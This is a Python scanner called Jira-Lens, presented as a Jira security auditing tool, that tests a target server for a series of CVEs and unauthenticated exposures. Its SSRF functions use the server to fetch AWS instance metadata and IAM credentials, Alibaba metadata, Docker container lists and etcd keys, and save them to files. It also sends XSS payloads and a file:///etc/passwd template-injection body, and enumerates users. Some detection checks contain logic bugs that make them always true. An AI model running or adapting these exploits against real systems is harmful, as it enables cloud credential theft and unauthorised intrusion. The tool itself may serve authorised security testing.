import sys
import progressbar
import json
import requests
import socket
import threading
import os
import time
from urllib.parse import urlparse
from config import *
import argparse
import urllib3
import random






def clean_url(url):
    while url.endswith("/"):
        url=url[0:-1]
    return url


def detect_version(base_url):
    r=requests.get(f"{base_url}/rest/api/latest/serverInfo",allow_redirects=False,headers=headers,verify=verify_ssl)
    try:
        server_data=json.loads(str(r.content,'utf-8'))
        print('\n')
        print(f"\t{GREEN}-------- Server Information -----------{RESET}")
        print("\n")
        print(f"{DIM}{MAGENTA} [*] URL --> ",server_data.get("baseUrl"))
        print(f"{DIM_RESET} [*] Server Title --> ",server_data.get("serverTitle"))
        print(" [*] Version --> " ,server_data.get("version"))
        print(" [*] Deployment Type --> ",server_data.get("deploymentType"))
        print(" [*] Build Number --> ",server_data.get("buildNumber"))
        print(" [*] Database Build Number --> ",server_data.get("databaseBuildNumber"))


        try:
            print(" [*] Host Address -->",socket.gethostbyaddr(urlparse(base_url).netloc)[0])
        except:
            print(" [*] Host Address --> Error While Resolving Host")
        try:
            print(" [*] IP Address -->",socket.gethostbyaddr(urlparse(base_url).netloc)[2][0])
            print("\n")
        except:
            print(" [*] IP Address --> Error While Resolving IP Address")
            print("\n")

    except KeyboardInterrupt:
        print (f"{RED} Keyboard Interrupt Detected {RESET}")
        sys.exit(0)

    except Exception as e:
        print(f"{RED}An Unexpected Error Occured:{RESET} {e}")


def isaws(base_url):
    try:
        if "amazonaws" in socket.gethostbyaddr(urlparse(base_url).netloc)[0]:
            return True
        else:
            return False
    except:
        None



''' Different CVE's Defined For Scanning. Add New CVE's Here '''


def CVE_2017_9506(base_url): #(SSRF):
    to_load="https://google.com"
    r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
    if r.status_code==200 and "googlelogo" in str(r.content):
        print(f"{RED}[+] {GREEN} [CRITICAL] {RESET} Vulnerable To CVE-2017-9506 (SSRF) : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}\n")
        response.append(f"[+] [CRITICAL] Vulnerable To CVE-2017-9506 (SSRF) : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}\n")
        print("\tChecking For AWS Metadata Extraction\n")
        if is_aws:
            print("\tAWS Instance Found")
            print("\tExfiltrating Data from the Insatance")
            to_load="http://169.254.169.254/latest/meta-data/"
            print("\n\tDUMPING AWS INSTANCE DATA ")
            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_INSTANCE}",allow_redirects=False,headers=headers,verify=verify_ssl)
            aws_instance=str(r.content,'utf-8')
            if r.status_code == 200:
                print(f"\tAWS INSTANCE Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_INSTANCE}")

            print("\n\tDUMPING AWS METADATA ")
            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_METADATA}",allow_redirects=False,headers=headers,verify=verify_ssl)
            aws_metadata=str(r.content,'utf-8')
            if r.status_code == 200:
                print(f"\tAWS Metadata Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_METADATA}")

            print("\n\tDUMPING AWS IAM DATA ")
            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_IAM_DATA}",allow_redirects=False,headers=headers,verify=verify_ssl)
            aws_iam_data=str(r.content,'utf-8')
            if r.status_code == 200:
                print(f"\tAWS IAM DATA Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_IAM_DATA}\n")
            filename=f"CVE-2017-9506_{urlparse(url).netloc}.txt"
            with open(f"{output_folder}{filename}",'a') as cve_file:
                cve_file.write(aws_instance)
                cve_file.write(aws_metadata)
                cve_file.write(aws_iam_data)
                print(f"\tExfiltrated Data Written to [CVE-2017-9506_{urlparse(url).netloc}.txt]\n\n ")


        to_load="http://100.100.100.200/latest/meta-data/"
        print("\tChecking for Alibaba Metadata Exfiltration")
        r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
        if r.status_code == 200:
            print(f"\t----> Alibaba Metadata Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}")

        to_load="http://127.0.0.1:2375/v1.24/containers/json"
        print("\tChecking for Docker Container Lists")
        r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
        if r.status_code == 200:
            print(f"\t----> Docker Lists Found : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}")

        to_load="http://127.0.0.1:2379/v2/keys/?recursive=true"
        print("\tChecking Kubernetes ETCD API keys")
        r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
        if r.status_code == 200:
            print(f"\t-----> Kubernetes ETCD API keys Found : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={to_load}")

    else:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2017-9506")

def CVE_2019_8449(base_url): # User Info Disclosure:
    r=requests.get(f"{base_url}/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true",allow_redirects=False,headers=headers,verify=verify_ssl)
    #print(str(r.content))
    if r.status_code==200:
        if "You are not authenticated. Authentication required to perform this operation." in str(r.content):
            print(f"{GRAY}[-] Not Vulnerable To CVE-2019-8449\n")
        else:
            print(f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2019-8449 : {base_url}/rest/pi/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true\n")
            response.append(f"[+] [LOW] Vulnerable To CVE-2019-8449 : {base_url}/rest/pi/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true\n")
    else:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2019-8449\n")


def CVE_2019_8442(base_url): #(Sensitive info disclosure):
    r=requests.get(f"{base_url}/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml", allow_redirects=False,headers=headers,verify=verify_ssl)
    if r.status_code != 200:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2019-8442\n")
    else:
        print(f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2019-8442 : {base_url}/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml\n")
        response.append(f"[+] [LOW] Vulnerable To CVE-2019-8442 : {base_url}/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml\n")

def CVE_2019_8443(base_url): #(Sensitive info disclosure):
    r=requests.get(f"{base_url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml", allow_redirects=False,headers=headers,verify=verify_ssl)
    if r.status_code == 200 or "<project" in str(r.content):
        print(f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2019-8443 : {base_url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml\n")
        response.append(f"[+] [LOW] Vulnerable To CVE-2019-8443 : {base_url}/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml\n")
    else:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2019-8443\n")

def CVE_2019_8451(base_url): #(SSRF):
    to_load="https://google.com"
    r=requests.get(f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
    if r.status_code==200 and "googlelogo" in str(r.content):
        print(f"{RED}[+] {GREEN} [CRITICAL]{RESET} Vulnerable To CVE-2019-8451 (SSRF) : {base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}\n")
        response.append(f"[+] [CRITICAL] Vulnerable To CVE-2019-8451 (SSRF) : {base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}\n")
        print("\tChecking For AWS Metadata Extraction\n")
        if is_aws:
            print("\tAWS Instance Found")
            print("\tExfiltrating Data from the Insatance")
            to_load="http://169.254.169.254/latest/meta-data/"
            print("\nDUMPING AWS INSTANCE DATA ")
            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_INSTANCE}",allow_redirects=False,headers=headers,verify=verify_ssl)
            aws_instance=str(r.content,'utf-8')
            if r.status_code == 200:
                print(f"\tAWS INSTANCE Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_INSTANCE}")

            print("\n\tDUMPING AWS METADATA ")
            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_METADATA}",allow_redirects=False,headers=headers,verify=verify_ssl)
            aws_metadata=str(r.content,'utf-8')
            if r.status_code == 200:
                print(f"AWS Metadata Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_METADATA}")

            print("\n\tDUMPING AWS IAM DATA ")
            r=requests.get(f"{base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_IAM_DATA}",allow_redirects=False,headers=headers,verify=verify_ssl)
            aws_iam_data=str(r.content,'utf-8')
            if r.status_code == 200:
                print(f"\tAWS IAM DATA Recovered : {base_url}/plugins/servlet/oauth/users/icon-uri?consumerUri={AWS_IAM_DATA}\n")
            filename=f"CVE-2019-8451_{urlparse(url).netloc}.txt"
            with open(f"{output_folder}{filename}",'a') as cve_file:
                cve_file.write(aws_instance)
                cve_file.write(aws_metadata)
                cve_file.write(aws_iam_data)
                print(f"\tExfiltrated Data Written to [CVE-2019-8451_{urlparse(url).netloc}.txt] \n\n")

        to_load="http://100.100.100.200/latest/meta-data/"
        print("\tChecking for Alibaba Metadata Exfiltration")
        r=requests.get(f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
        if r.status_code == 200:
            print(f"\tAlibaba Metadata Recovered : {base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}")

        to_load="http://127.0.0.1:2375/v1.24/containers/json"
        print("\tChecking for Docker Container Lists")
        r=requests.get(f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
        if r.status_code == 200:
            print(f"\tDocker Lists Found : {base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}")

        to_load="http://127.0.0.1:2379/v2/keys/?recursive=true"
        print("\tChecking Kubernetes ETCD API keys\n")
        r=requests.get(f"{base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}",allow_redirects=False,headers=headers,verify=verify_ssl)
        if r.status_code == 200:
            print(f"\tKubernetes ETCD API keys Found : {base_url}/plugins/servlet/gadgets/makeRequest?url={to_load}\n")

    else:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2019-8451\n")

def CVE_2019_3403(base_url): #(User enum):
    r=requests.get(f"{base_url}/rest/api/2/user/picker?query=admin", allow_redirects=False,headers=headers,verify=verify_ssl)
    #print(str(r.content))
    if "The user named \'{0}\' does not exist" or "errorMessages" in str(r.content):
        print(f"{GRAY}[-] Not Vulnerable To CVE-2019-3403\n")
    else:
        print(f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2019-3403 : {base_url}/rest/api/2/user/picker?query=admin\n")
        response.append(f"[+] [LOW] Vulnerable To CVE-2019-3403 : {base_url}/rest/api/2/user/picker?query=admin\n")


def CVE_2019_3402(base_url): #XSS in the labels gadget:
    r=requests.get(f"{base_url}/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(\"XSS\")%3C%2fscript%3Et1nmk&Search=Search", allow_redirects=False,headers=headers,verify=verify_ssl)
    if "XSS" in str(r.content):
        print(f"{RED}[+] {GREEN} [HIGH]{RESET} Vulnerable To CVE-2019-3402 [Maybe] : {base_url}/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(\"XSS\")%3C%2fscript%3Et1nmk&Search=Search\n")
        response.append(f"[+] [HIGH]  Vulnerable To CVE-2019-3402 [Maybe] {base_url}/secure/ConfigurePortal: {base_url}/secure/ConfigurePortalPages!default.jspa?view=search&searchOwnerUserName=x2rnu%3Cscript%3Ealert(\"XSS\")%3C%2fscript%3Et1nmk&Search=Search\n")
    else:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2019-3402\n")


def  CVE_2019_11581(base_url): #(SSTI):
    r=requests.get(f"{base_url}/secure/ContactAdministrators!default.jspa", allow_redirects=False,verify=verify_ssl)
    if r.status_code==200:
        if "Your Jira administrator" or "Contact Site Administrators"  in str(r.content):
            print(f"{GRAY}[-] Not Vulnerable To CVE-2019-11581\n")
        else:
            print(f"{RED}[+] {GREEN} [CRITICAL]{RESET} Vulnerable To CVE-2019-11581 [Confirm Manually] : {base_url}/secure/ContactAdministrators!default.jspa\n")
            response.append(f"[+] [CRITICAL] Vulnerable To CVE-2019-11581 [Confirm Manually] : {base_url}/secure/ContactAdministrators!default.jspa\n")
    else:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2019-11581\n")

def CVE_2020_14179(base_url): #(Info disclosure):
    r=requests.get(f"{base_url}/secure/QueryComponent!Default.jspa",allow_redirects=False,headers=headers,verify=verify_ssl)
    if r.status_code != 200:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2020-14179\n")
    else:
        print(f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2020-14179 : {base_url}/secure/QueryComponent!Default.jspa\n")
        response.append(f"[+] [LOW] Vulnerable To CVE-2020-14179 : {base_url}/secure/QueryComponent!Default.jspa\n")


def CVE_2020_14181(base_url): #(User enum):
    r=requests.get(f"{base_url}/secure/ViewUserHover.jspa?username=Admin",allow_redirects=False,headers=headers,verify=verify_ssl)
    if r.status_code !=200 or "Your session has timed out" in str(r.content):
        print(f"{GRAY}[-] Not Vulnerable To CVE-2020-14181\n")
    else:
        print(f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2020-14181 : {base_url}/secure/ViewUserHover.jspa?username=Admin\n")
        response.append(f"[+] [LOW] Vulnerable To CVE-2020-14181 : {base_url}/secure/ViewUserHover.jspa?username=Admin\n")


def CVE_2018_20824(base_url): #(XSS):
    print("\n")
    r=requests.get(f"{base_url}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(\"XSS_POPUP\")",allow_redirects=False,headers=headers,verify=verify_ssl)
    if "XSS_POPUP" in str(r.content):
        print(f"{RED}[+] {GREEN} [HIGH]{RESET} Vulnerable To CVE-2018-20824 : {base_url}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)\n")
        response.append(f"[+] [HIGH] Vulnerable To CVE-2018-20824 : {base_url}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)\n")
    else:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2018-20824\n")


def CVE_2019_3396(base_url): #(Path Traversal & RCE):
    body = ' {"contentId":"1","macro":{"name":"widget","params":{"url":"https://google.com","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}} '
    r=requests.get(f"{base_url}/rest/tinymce/1/macro/preview", allow_redirects=False,headers=headers,verify=verify_ssl)
    if r.status_code != 200:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2019-3396\n")
    else:
        r=requests.post(f"{base_url}/rest/tinymce/1/macro/preview", data=body,headers=headers,verify=verify_ssl)
        if "root" in str(r.content):
            print(f"{RED}[+] {GREEN} [CRITICAL]{RESET} Vulnerable To CVE-2019-3396 : {base_url}/rest/tinymce/1/macro/preview\n")
            response.append(f"{RED}[+] [CRITICAL] Vulnerable To CVE-2019-3396 : {base_url}/rest/tinymce/1/macro/preview\n")

def CVE_2020_36287(base_url,ii):
    try:
        r=requests.get(f"{base_url}/rest/dashboards/1.0/10000/gadget/{ii}/prefs")
        if r.status_code==200:
            if "userPrefsRepresentation" in str(r.content):
                response_CVE_2020_36287.append(f"{base_url}/rest/dashboards/1.0/10000/gadget/{ii}/prefs\n")
    except:
        pass

def CVE_2020_36287_helper(base_url):
    widgets = ['BruteForcing Gagdet ID... ', progressbar.AnimatedMarker()]
    bar = progressbar.ProgressBar(widgets=widgets).start()
    for i in range(50):
        time.sleep(0.1)
        bar.update(i)

    with open('helper.txt','a') as no:
        for i in range(10000,10500):
            no.write(str(i)+'\n')

    with open('helper.txt','r') as op:
        threads=[]

        for num in op:
            t=threading.Thread(target=CVE_2020_36287,args=(base_url,num.strip()))
            t.start()
            threads.append(t)
        for tt in threads:
            tt.join()

    if len(response_CVE_2020_36287) != 0:
        filename=f"CVE-2020-36287_{urlparse(url).netloc}.txt"
        with open(f"{output_folder}{filename}",'a') as res:

            for i in range(0,len(response_CVE_2020_36287)):
                res.write(response_CVE_2020_36287[i])
    else:
        pass

    os.remove("helper.txt")

def CVE_2020_36287_helper_2():
    if len(response_CVE_2020_36287) != 0:
        print(f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2020-36287\n")
        response.append(f"[+] [LOW] Vulnerable To CVE-2020-36287 : File Written at [CVE-2020-36287_{urlparse(url).netloc}.txt]\n")
        print(f"\n\tFound Dashboard Gadegts\n\tWritten To File [CVE-2020-36287_{urlparse(url).netloc}.txt]\n")
    else:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2020-36287\n")


def CVE_2020_36289(base_url):
    r=requests.get(f"{base_url}/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin",verify=verify_ssl)
    #print("\n")
    if r.status_code ==200:
        if "Assignee" in str(r.content):
            print(f"{RED}[+] {GREEN} [MEDIUM] {RESET}Vulnerable To CVE-2020-36289 : {base_url}/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin\n")
            response.append(f"[+] [MEDIUM] Vulnerable To CVE-2020-36289 : {base_url}/jira/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin\n")
        else:
            print(f"{GRAY}[-] Not Vulnerable To CVE 2020 36289\n")
    else:
        print(f"{GRAY}[-] Not Vulnerable To CVE 2020 36289\n")

def CVE_2020_14178(base_url):
    r1 = requests.get(f"{base_url}/browse.{random.randint(100,1000)}", verify=verify_ssl)
    r2 = requests.get(f"{base_url}/browse.{random.randint(100,1000)}", verify=verify_ssl)
    keyword = "Project Does Not Exist"
    if keyword in str(r1.content) or keyword in str(r2.content):
        print(f"{RED}[+] {GREEN} [LOW]{RESET} Vulnerable To CVE-2020-14178 : {base_url}/browse.PROJECTKEY\n")
        response.append(f"[+] [LOW] Vulnerable To CVE-2020-14178 : {base_url}/browse.PROJECTKEY\n")
    else:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2020-14178\n")

def CVE_2018_5230(base_url):
    r = requests.get(f"{base_url}/pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert%281%29%22%3E.vm", verify=verify_ssl)
    if "alert(1)" in str(r.content):
        print(f"{RED}[+] {GREEN} [HIGH]{RESET} Vulnerable To CVE-2018-5230 : {base_url}/pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert%281%29%22%3E.vm\n")
        response.append(f"[+] [HIGH] Vulnerable To CVE-2018-5230 {base_url}/pages/%3CIFRAME%20SRC%3D%22javascript%3Aalert%281%29%22%3E.vm\n")
    else:
        print(f"{GRAY}[-] Not Vulnerable To CVE-2018-5230\n")







''' Different Disclosures Defined For Scanning . Add New Disclosures Here'''



def user_reg(base_url):
    try:
        r=requests.get(f"{base_url}/secure/Signup!default.jspa",allow_redirects=False, verify=verify_ssl)
        if r.status_code ==200:
            if "private"  in str(r.content):
                print(f"{GRAY}[-] User regestration is Disabled{RESET}\n")
            else:
                print(f"{RED}[+] {GREEN}[Medium]{RESET} User regestration is Enabled : {base_url}/secure/Signup!default.jspa\n")
                response.append(f"[+] [Medium] User regestration is Enabled : {base_url}/secure/Signup!default.jspa\n")
        else:
            print(f"{GRAY}[-] User regestration is Disabled{RESET}\n")
    except KeyboardInterrupt:
        print(f"{RED} User Aborted the Program {RESET}")




def dev_mode(base_url):
    r=requests.get(f"{base_url}/",allow_redirects=False,verify=verify_ssl)
    if r.status_code ==200:
        if "<meta name=\"ajs-dev-mode\" content=\"true\">"  in str(r.content):
            print(f"{RED}[+] {GREEN} [LOW]{RESET} Dev Mode is Enabled : {base_url}/ {RESET}\n")
            response.append(f"[+] [LOW] Dev Mode is Enabled : {base_url}/ {RESET}\n")
        else:
            print(f"{GRAY}[-] Dev Mode is Disabled{RESET}\n")
    else:
        print(f"{GRAY}[-] Dev Mode is Disabled{RESET}\n")



def Unauth_User_picker(base_url):
    r=requests.get(f"{base_url}/secure/popups/UserPickerBrowser.jspa",allow_redirects=False,headers=headers)
    if r.status_code != 200:
        print(f"{GRAY}[-] User Picker Disabled{RESET}\n")
    else:
        if "user-picker" in str(r.content):
            print(f"{RED}[+] {CYAN}[INFO]{RESET} User Picker Enabled : {base_url}/secure/popups/UserPickerBrowser.jspa?max=1000\n")
            response.append(f"[+] [INFO] User Picker Enabled : {base_url}/secure/popups/UserPickerBrowser.jspa?max=1000\n")


def Unauth_Group_Picker(base_url):
    r=requests.get(f"{base_url}/rest/api/2/groupuserpicker", allow_redirects=False,headers=headers)
    if r.status_code ==200:
        if "You are not authenticated. Authentication required to perform this operation." in str(r.content):
            print(f"{GRAY}[-] REST GroupUserPicker is not available\n")
        else:
            print(f"{RED}[+] {CYAN}[INFO]{RESET} REST GroupUserPicker is available : {base_url}/rest/api/2/groupuserpicker\n")
            response.append(f"[+] [INFO] REST GroupUserPicker is available : {base_url}/rest/api/2/groupuserpicker\n")
    else:
        #print(f"{RED}Unable To Connect . [Status :"+str({r.status_code})+"]")
        print(f"{GRAY}[-] REST GroupUserPicker is not available\n")


def Unauth_Resolutions(base_url):
    r=requests.get(f"{base_url}/rest/api/2/resolution",allow_redirects=False,headers=headers)
    if r.status_code ==200:
        if 'self' or 'description' or 'name' in str(r.content):
            print(f"{RED}[+] {CYAN} [INFO] {RESET} Resolutions Found : {base_url}/rest/api/2/resolution\n")
            response.append(f"[+] [INFO] Resolutions Found : {base_url}/rest/api/2/resolution\n")
        else:
            print(f"{GRAY}[-] No Resolutions Found\n")
    else:
        print(f"{GRAY}[-] No Resolutions Found\n")





def Unauth_Projects(base_url):
    r=requests.get(f"{base_url}/rest/api/2/project?maxResults=100",allow_redirects=False,headers=headers)
    if r.status_code ==200:
        if 'projects' and 'startAt' and 'maxResults' in str(r.content):
            print(f"{RED}[+] {GREEN}[LOW] {RESET}Projects Found : {base_url}/rest/api/2/project?maxResults=100\n")
            response.append(f"[+] [LOW] Projects Found : {base_url}/rest/api/2/project?maxResults=100\n")
        else:
            print(f"{GRAY}[-] Projects Not Found\n")
    else:
        print(f"{GRAY}[-] Projects Not Found\n")


def Unauth_Project_categories(base_url):
    r=requests.get(f"{base_url}/rest/api/2/projectCategory?maxResults=1000",allow_redirects=False,headers=headers)
    if r.status_code ==200:
        if 'self' or 'description' or 'name' in str(r.content):
            print(f"{RED}[+] {GREEN}[LOW]{RESET} Project Groups Found : {base_url}/rest/api/2/projectCategory?maxResults=1000\n")
            response.append(f"[+] [LOW] Project Groups Found : {base_url}/rest/api/2/projectCategory?maxResults=1000\n")
        else:
            print(f"{GRAY}[-] Project Groups Not Found{RESET}\n")
    else:
        print(f"{GRAY}[-] Project Groups Not Found{RESET}\n")


def Unauth_Dashboard(base_url):
    r=requests.get(f"{base_url}/rest/api/2/dashboard?maxResults=100",allow_redirects=False,headers=headers)
    if r.status_code ==200:
        if 'dashboards' and 'startAt' and 'maxResults' in str(r.content):
            print(f"{RED}[+] {CYAN}[INFO]{RESET} Found Unauthenticated DashBoard Access{RESET} : {base_url}/rest/api/2/dashboard?maxResults=100\n")
            response.append(f"[+] [INFO] Found Unauthenticated DashBoard Access : {base_url}/rest/api/2/dashboard?maxResults=100\n")
        else:
            print(f"{GRAY}[-] No Unauthenticated DashBoard Access Found{RESET}\n")
    else:
        print(f"{GRAY}[-] No Unauthenticated DashBoard Access Found{RESET}\n")



def Unauth_Dashboard_Popular(base_url):
    r=requests.get(f"{base_url}/secure/ManageFilters.jspa?filter=popular&filterView=popular",allow_redirects=False,headers=headers)
    if r.status_code ==200:
        if 'Popular Filters' in str(r.content):
            print(f"{RED}[+] {CYAN}[INFO]{RESET} Filters Accessible : {base_url}/secure/ManageFilters.jspa?filter=popular&filterView=popular\n")
            response.append(f"[+] [INFO] Filters Accessible : {base_url}/secure/ManageFilters.jspa?filter=popular&filterView=popular\n")
        else:
            print(f"{GRAY}[-] Filters Not Accessible{RESET}\n")
    else:
        print(f"{GRAY}[-] Filters Not Accessible{RESET}\n")


def Unauth_Dashboard_admin(base_url):
    r=requests.get(f"{base_url}/rest/menu/latest/admin",allow_redirects=False,headers=headers)
    if r.status_code ==200:
        if 'key' and 'link' and 'label' and 'self' in str(r.content):
            print(f"{RED}[+] {CYAN}[INFO] {RESET} Admin Project Dashboard Accessible : {base_url}/rest/menu/latest/admin\n")
            response.append(f"[+] [INFO]  Admin Project Dashboard Accessible : {base_url}/rest/menu/latest/admin\n")
        else:
            print(f"{GRAY}[-] Admin Project Dashboard UnAccessible\n")
    else:
        print(f"{GRAY}[-] Admin Project Dashboard UnAccessible\n")



def Service_desk_signup(base_url):
    body='{"email":"invalid","signUpContext":{},"secondaryEmail":"","usingNewUi":true}'
    r=requests.get(f"{base_url}/servicedesk/customer/user/signup",allow_redirects=False,headers=headers)
    if r.status_code ==200 :
        if "Service Management" in str(r.content):
            print(f"{RED}[+] {GREEN}[MEDIUM]{RESET} Service Desk Signup Enabled : {base_url}/servicedesk/customer/user/signup{RESET}\n")
            response.append(f"[+] [MEDIUM] Service Desk Signup Enabled : {base_url}/servicedesk/customer/user/signup\n")
    else:
        print(f"{GRAY}[-] Service Desk Signup Disabled{RESET}\n")


def Unauth_Install_Gadgets(base_url):
    r=requests.get(f"{base_url}/rest/config/1.0/directory")
    if r.status_code ==200 :
        if "jaxbDirectoryContents" in str(r.content):
            print(f"{RED}[+] {GREEN}[LOW]{RESET} REST Gadegts Accessible : {base_url}/rest/config/1.0/directory{RESET}\n")
            response.append(f"[+] [LOW] REST Gadegts Accessible : {base_url}/rest/config/1.0/directory\n")
    else:
        print(f"{GRAY}[-] REST Gadegts UnAccessible\n")



def FieldNames_QueryComponentJql(base_url):
    r=requests.get(f"{base_url}/secure/QueryComponent!Jql.jspa?jql=",allow_redirects=False,headers=headers)
    if r.status_code ==200:
        if "searchers" in str(r.content):
            print(f"{RED}[+] {GREEN}[LOW] {RESET}Found Query Component Fields : {base_url}/secure/QueryComponent!Jql.jspa?jql=\n")
            response.append(f"[+] [LOW] Found Query Component Fields : {base_url}/secure/QueryComponent!Jql.jspa?jql=\n")
        else:
            print(f"{GRAY}[-] No Query Component Fields Found{RESET}\n")
    else:
        print(f"{GRAY}[-] No Query Component Fields Found{RESET}\n")


def Unauth_Screens(base_url):
    r=requests.get(f"{base_url}/rest/api/2/screens",allow_redirects=False)
    if r.status_code==200:
        if "id" or "name" or "description" in str(r.content):
            print(f"{RED}[+] {GREEN}[LOW] {RESET} Unauthenticated Access To Screens : {base_url}/rest/api/2/screens\n")
            response.append(f"[+] [LOW] Unauthenticated Access To Screens : {base_url}/rest/api/2/screens\n")
        else:
            print(f"{GRAY}[-] No Unauthenticated Access To Screens Found{RESET}\n")
    else:
        print(f"{GRAY}[-] No Unauthenticated Access To Screens Found{RESET}\n")




def write_response(response):
    filename=f"Jira-Lens_{urlparse(url).netloc}.txt"
    with open(f"{output_folder}{filename}",'a') as final:
        for items in response:
            final.write(items)
            final.write("\n")
    print(f"\n\n\n\t{RED}File Written to : Jira-Lens_{urlparse(url).netloc}.txt{RESET}\n")



def worker(url):

    try:
        base_url=clean_url(url)
        detect_version(base_url)
        is_aws=isaws(base_url)
        CVE_2017_9506(base_url)
        CVE_2018_20824(base_url)
        CVE_2019_3402(base_url)
        CVE_2019_3403(base_url)
        CVE_2019_3396(base_url)
        CVE_2019_8442(base_url)
        CVE_2019_8443(base_url)
        CVE_2019_8449(base_url)
        CVE_2019_8451(base_url)
        CVE_2019_11581(base_url)
        CVE_2020_14179(base_url)
        CVE_2020_14181(base_url)
        CVE_2020_36287_helper(base_url)
        CVE_2020_36287_helper_2()
        CVE_2020_36289(base_url)
        CVE_2020_14178(base_url)
        CVE_2018_5230(base_url)
        Unauth_User_picker(base_url)
        Unauth_Resolutions(base_url)
        Unauth_Projects(base_url)
        Unauth_Project_categories(base_url)
        Unauth_Dashboard(base_url)
        Unauth_Dashboard_admin(base_url)
        Service_desk_signup(base_url)
        Unauth_Install_Gadgets(base_url)
        user_reg(base_url)
        Unauth_Group_Picker(base_url)
        Unauth_Screens(base_url)
        FieldNames_QueryComponentJql(base_url)
        write_response(response)

    except KeyboardInterrupt:
        print (f"{RED} Keyboard Interrupt Detected {RESET}")
        sys.exit(0)

    except Exception as e:
        print(f"{RED}An Unexpected Error Occured : {RESET}  {e}")





def main():
    try:
        global url
        global output_folder
        global is_aws
        global base_url
        global verify_ssl
        verify_ssl=True
        parser = argparse.ArgumentParser(description="Jira-Lens : Jira Security Auditing Tool")
        parser.add_argument("-u","--url", help="Target URL",dest='url')
        parser.add_argument('-f','--file',type=argparse.FileType('r'),dest='input_file')
        parser.add_argument('-c','--cookie',help="Provide authentication cookie(s)")
        parser.add_argument('-o','--output',help="Output Folder for files",default="output/",required=False)
        parser.add_argument('-i', '--insecure', help="Output Folder for files", action="store_true", required=False)

        args= parser.parse_args()
        banner()
        url=args.url
        output_folder=args.output
        if os.path.isdir(output_folder)==False:
